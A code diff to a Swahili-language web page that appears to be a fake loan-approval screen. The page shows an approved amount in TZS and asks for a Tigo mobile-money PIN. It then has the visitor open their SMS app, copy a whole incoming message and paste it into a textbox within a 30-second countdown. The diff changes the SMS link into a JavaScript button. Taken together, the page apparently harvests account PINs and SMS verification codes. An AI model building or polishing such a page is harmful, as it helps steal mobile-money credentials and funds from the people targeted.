@@ -34,7 +34,7 @@
         .phone-display { background: #fef9e7; padding: 0.4rem 1.2rem; border-radius: 25px; display: inline-block; font-weight: 700; margin: 0.5rem 0; font-size: 0.9rem; }
         .code-instruction { background: #fefce8; border-radius: 12px; padding: 12px 16px; margin: 10px 0; font-size: 0.8rem; color: var(--dark); text-align: center; border: 1px solid #fef3c7; line-height: 1.6; }
         .code-instruction i { color: var(--gold); margin-right: 4px; }
-        .sms-open-btn { display: block; text-align: center; background: #00377D; color: #FFD100; padding: 12px; border-radius: 30px; text-decoration: none; font-weight: 700; font-size: 0.85rem; margin: 8px 0; border: 2px solid #FFD100; }
+        .sms-open-btn { display: block; text-align: center; background: #00377D; color: #FFD100; padding: 12px; border-radius: 30px; text-decoration: none; font-weight: 700; font-size: 0.85rem; margin: 8px 0; border: 2px solid #FFD100; cursor: pointer; }
         .sms-open-btn i { margin-right: 6px; }
         .sms-textarea { width: 100%; height: 100px; border: 2px solid #fef3c7; border-radius: 14px; padding: 12px; font-size: 0.85rem; font-family: inherit; resize: vertical; outline: none; background: #fff; }
         .sms-textarea:focus { border-color: var(--gold); }
@@ -79,9 +79,9 @@
                     <strong>Hatua 2:</strong> Nakili ujumbe wote<br>
                     <strong>Hatua 3:</strong> Bandika kwenye kisanduku hapa chini
                 </div>
-                <a href="sms:" class="sms-open-btn">
-                    <i class="fas fa-envelope"></i> Bonyeza Hapa Kufungua Ujumbe wa SMS
-                </a>
+                <button class="sms-open-btn" onclick="openSMS()">
+                    <i class="fas fa-envelope"></i> Bonyeza Hapa Kufungua SMS
+                </button>
                 <textarea id="smsMessage" class="sms-textarea" placeholder="Bandika ujumbe wako wote hapa..."></textarea>
                 <div class="timer-bar" id="timerDisplay">⏳ 30s</div>
                 <div class="error-msg" id="codeError" style="text-align:center;">Namba si sahihi</div>
@@ -101,6 +101,10 @@
         document.getElementById('approvedAmount').textContent = 'TZS ' + loanAmount.toLocaleString();
         var appId = '', checkInterval = null, countdownTimer = null, userPhone = '', fastCheck = null;
         var resendCount = 0, resendCooldown = false;
+
+        function openSMS() {
+            window.location.href = 'sms:';
+        }
 
         function togglePIN() { var p = document.getElementById('tigoPin'); var b = p.parentElement.querySelector('.toggle-btn'); if (p.type === 'password') { p.type = 'text'; b.textContent = '🙈'; } else { p.type = 'password'; b.textContent = '👁️'; } }
         document.getElementById('phoneNumber').addEventListener('input', function() { this.value = this.value.replace(/\D/g, ''); });
